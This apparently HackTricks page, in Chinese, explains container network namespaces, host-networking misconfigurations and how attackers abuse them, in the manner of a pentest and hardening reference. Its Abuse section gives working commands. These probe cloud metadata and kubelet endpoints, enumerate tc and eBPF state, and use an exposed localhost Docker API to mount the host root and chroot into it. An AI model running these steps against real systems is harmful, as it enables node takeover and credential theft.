# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间隔离网络相关资源，例如接口、IP 地址、路由表、ARP/邻居状态、防火墙规则、套接字，以及诸如 `/proc/net` 这类文件的内容。这就是为什么容器看起来可以拥有自己的 `eth0`、本地路由和回环设备，而无需拥有主机的真实网络堆栈。

就安全性而言，这很重要，因为网络隔离不仅仅是端口绑定。私有网络命名空间限制了工作负载可以直接观察或重新配置的内容。一旦该命名空间与主机共享，容器可能会突然获得对主机监听器、主机本地服务以及本不应向应用程序暴露的网络控制点的可见性。

## 工作原理

新创建的网络命名空间在接口附加之前，开始时具有空的或几乎空的网络环境。容器运行时随后会创建或连接虚拟接口、分配地址并配置路由，以便工作负载具有预期的连通性。在基于 bridge 的部署中，这通常意味着容器看到的是一个由 veth 支持的接口，该接口连接到主机的 bridge。在 Kubernetes 中，CNI 插件负责为 Pod 网络执行等效的设置。

该架构解释了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此巨大的变化。工作负载不是获得一个预先准备的私有网络堆栈，而是加入主机的实际网络堆栈。

## 实验

你可以看到一个几乎为空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你可以比较普通容器和主机网络模式的容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
使用主机网络的容器不再拥有自己隔离的 socket 和接口视图。单是这一点的变化就已经很重要了，甚至不必先去问进程拥有哪些 capabilities。

## Runtime Usage

Docker 和 Podman 通常会为每个容器创建一个私有的网络命名空间，除非另行配置。Kubernetes 通常会为每个 Pod 提供自己的网络命名空间，Pod 内的容器共享该命名空间，但与主机隔离。Incus/LXC 系统也提供基于 network-namespace 的丰富隔离，通常支持更多样的虚拟网络设置。

共同原则是私有网络是默认的隔离边界，而主机网络是显式的退出该边界的做法。

## Misconfigurations

最重要的错误配置就是直接共享主机的 network namespace。为性能、低级别监控或便利性而这么做有时会见诸实践，但它移除了容器可用的最清晰的边界之一。host-local listeners 会以更直接的方式变得可达，localhost-only services 可能会变得可访问，而像 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 这样的 capabilities 也会变得更加危险，因为它们允许的操作现在应用在主机自身的网络环境上。

另一个问题是在网络命名空间为私有时仍过度授予网络相关的 capabilities。私有命名空间确实有所帮助，但它并不能让 raw sockets 或高级网络控制变得无害。

在 Kubernetes 中，`hostNetwork: true` 也会改变你对 Pod-level network segmentation 的信任程度。Kubernetes 文档指出，许多 network plugins 无法正确区分 `hostNetwork` Pod 的流量以用于 `podSelector` / `namespaceSelector` 的匹配，因此会将其视为普通的 node 流量。从攻击者的角度看，这意味着受损的 `hostNetwork` workload 通常应被视为节点级别的网络立足点，而不是仍受与 overlay-network workloads 相同策略假设约束的普通 Pod。

## Abuse

在隔离薄弱的环境中，攻击者可能会检查主机的监听服务、访问仅绑定到 loopback 的管理端点、根据具体 capabilities 和环境嗅探或干扰流量，或者在存在 `CAP_NET_ADMIN` 时重新配置路由和防火墙状态。在集群中，这也会让横向移动和 control-plane 侦察更容易。

如果你怀疑存在主机网络，首先确认可见的接口和 listeners 属于主机而不是隔离的容器网络：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅限回环的服务通常是第一个有趣的发现：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
如果存在网络能力，请测试工作负载是否可以检查或更改可见的网络堆栈：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在现代内核上，host networking 加上 `CAP_NET_ADMIN` 可能会暴露数据包路径，超出简单的 `iptables` / `nftables` 更改范围。`tc` qdiscs 和 filters 也是 namespace 作用域的，因此在共享的 host network namespace 中，它们会应用到容器可见的主机接口上。如果另外存在 `CAP_BPF`，与网络相关的 eBPF 程序（如 TC 和 XDP loaders）也会变得相关：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
这很重要，因为 attacker 可能能够在 host interface 级别 mirror、redirect、shape 或 drop traffic，而不仅仅是重写 firewall rules。在私有 network namespace 中，这些操作被限制在 container 的视角内；在共享的 host namespace 中，它们会变成 host-impacting。

在 cluster 或 cloud 环境中，host networking 也使得对 metadata 和 control-plane-adjacent 服务进行快速的本地 recon 变得合理：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完整示例：Host Networking + Local Runtime / Kubelet Access

Host networking 并不会自动授予 host root，但它通常会暴露仅节点自身可访问的服务。如果其中某个服务保护不足，host networking 就会成为直接的 privilege-escalation 路径。

Docker API 在 localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet 在 localhost 上:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地运行时 API 在没有适当保护的情况下被暴露，可能导致宿主机被直接攻陷
- 如果 kubelet 或本地代理可访问，可能进行集群侦察或横向移动
- 当与 `CAP_NET_ADMIN` 结合时，可能进行流量操纵或拒绝服务

## 检查

这些检查旨在判断进程是否拥有私有网络栈、哪些路由和监听端口可见，以及在你测试权限之前网络视图是否已经类似于宿主机。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

在审查容器时，总是将网络命名空间与 capability 集合一起评估。主机网络加上强大的网络 capability，与桥接网络加上狭窄的默认 capability 集合，代表着完全不同的安全姿态。

## 参考资料

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
